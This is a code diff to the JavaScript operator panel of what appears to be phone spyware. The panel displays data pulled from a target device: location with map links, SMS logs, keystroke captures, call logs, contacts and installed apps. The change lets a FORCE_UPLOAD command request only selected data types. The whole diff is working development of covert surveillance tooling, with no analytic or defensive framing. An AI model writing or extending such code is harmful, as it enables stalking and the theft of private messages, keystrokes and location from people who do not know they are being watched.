@@ -586,20 +586,24 @@
 
                 if (dataPayload) {
                     const d = dataPayload.payload || dataPayload;
-                    
+                    const cmdContent = (c.content || "").toLowerCase();
+                    const isAll = cmdContent === "all" || type !== "FORCE_UPLOAD";
+
                     // MODULE: LOCATION
-                    if (d.location_fresh || d.stream_location || d.lat) {
+                    if ((isAll || cmdContent.includes("location")) && (d.location_fresh || d.stream_location || d.lat)) {
                         const loc = d.location_fresh || d.stream_location || d;
-                        const mapsUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
-                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.1); border:1px solid var(--primary);">
-                            <div style="color:var(--primary); font-size:0.7rem; font-weight:bold;">📍 LOCATION_IDENTIFIED</div>
-                            <div style="font-size:0.8rem; margin:5px 0;">Coord: ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} (±${loc.acc || 0}m)</div>
-                            <a href="${mapsUrl}" target="_blank" style="color:#fff; text-decoration:underline; font-size:0.75rem;">VIEW ON GOOGLE MAPS</a>
-                        </div>`;
+                        if (loc.lat) {
+                            const mapsUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
+                            dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.1); border:1px solid var(--primary);">
+                                <div style="color:var(--primary); font-size:0.7rem; font-weight:bold;">📍 LOCATION_IDENTIFIED</div>
+                                <div style="font-size:0.8rem; margin:5px 0;">Coord: ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} (±${loc.acc || 0}m)</div>
+                                <a href="${mapsUrl}" target="_blank" style="color:#fff; text-decoration:underline; font-size:0.75rem;">VIEW ON GOOGLE MAPS</a>
+                            </div>`;
+                        }
                     }
 
                     // MODULE: SMS
-                    if (d.sms_logs || d.historical_sms) {
+                    if ((isAll || cmdContent.includes("sms")) && ((d.sms_logs && d.sms_logs.length > 0) || (d.historical_sms && d.historical_sms.length > 0))) {
                         const logs = d.sms_logs || d.historical_sms;
                         dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(0,255,157,0.1); border:1px solid var(--success);">
                             <div style="color:var(--success); font-size:0.7rem; font-weight:bold;">💬 SMS_DATA_EXTRACTED (${logs.length})</div>
@@ -627,7 +631,7 @@
                     }
 
                     // MODULE: USAGE / TIMELINE
-                    if (d.screen_time_minutes !== undefined || d.app_usage_timeline) {
+                    if ((isAll || cmdContent.includes("usage")) && (d.screen_time_minutes !== undefined || (d.app_usage_timeline && d.app_usage_timeline.length > 0))) {
                         dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(245,158,11,0.1); border:1px solid #f59e0b;">
                             <div style="color:#f59e0b; font-size:0.7rem; font-weight:bold;">📈 USAGE_ANALYTICS</div>
                             <div style="font-size:0.8rem; margin:5px 0;">Screen Time: ${d.screen_time_minutes || 0}m</div>
@@ -636,7 +640,7 @@
                     }
 
                     // MODULE: TYPING / KEYLOGGER
-                    if (d.typing_history || d.summary_stats?.typing_chars) {
+                    if ((isAll || cmdContent.includes("typing")) && ((d.typing_history && d.typing_history.length > 0) || d.summary_stats?.typing_chars > 0)) {
                         dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(236,72,153,0.1); border:1px solid #ec4899;">
                             <div style="color:#ec4899; font-size:0.7rem; font-weight:bold;">⌨️ KEYSTROKE_LOGS</div>
                             <div style="font-size:0.8rem; margin:5px 0;">Chars Captured: ${d.summary_stats?.typing_chars || 0}</div>
@@ -645,7 +649,7 @@
                     }
 
                     // MODULE: CALLS
-                    if (d.calls) {
+                    if ((isAll || cmdContent.includes("calls")) && (d.calls && d.calls.length > 0)) {
                         dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(59,130,246,0.1); border:1px solid #3b82f6;">
                             <div style="color:#3b82f6; font-size:0.7rem; font-weight:bold;">📞 CALL_LOG_EXTRACTED (${d.calls.length})</div>
                             <div style="font-size:0.7rem; color:#aaa; margin-top:4px;">Latest: ${d.calls[0]?.name || 'Unknown'} (${d.calls[0]?.num || 'N/A'})</div>
@@ -653,14 +657,14 @@
                     }
 
                     // MODULE: CONTACTS
-                    if (d.contacts) {
+                    if ((isAll || cmdContent.includes("contacts")) && (d.contacts && d.contacts.length > 0)) {
                         dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(16,185,129,0.1); border:1px solid #10b981;">
                             <div style="color:#10b981; font-size:0.7rem; font-weight:bold;">👥 CONTACT_LIST_SYNC (${d.contacts.length})</div>
                         </div>`;
                     }
 
                     // MODULE: APPS
-                    if (d.apps) {
+                    if ((isAll || cmdContent.includes("apps")) && (d.apps && d.apps.length > 0)) {
                         dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(139,92,246,0.1); border:1px solid #8b5cf6;">
                             <div style="color:#8b5cf6; font-size:0.7rem; font-weight:bold;">📦 APP_INVENTORY_EXTRACTED (${d.apps.length})</div>
                             <div style="font-size:0.7rem; color:#aaa; margin-top:4px;">Newest: ${d.apps[0]?.name || 'N/A'}</div>
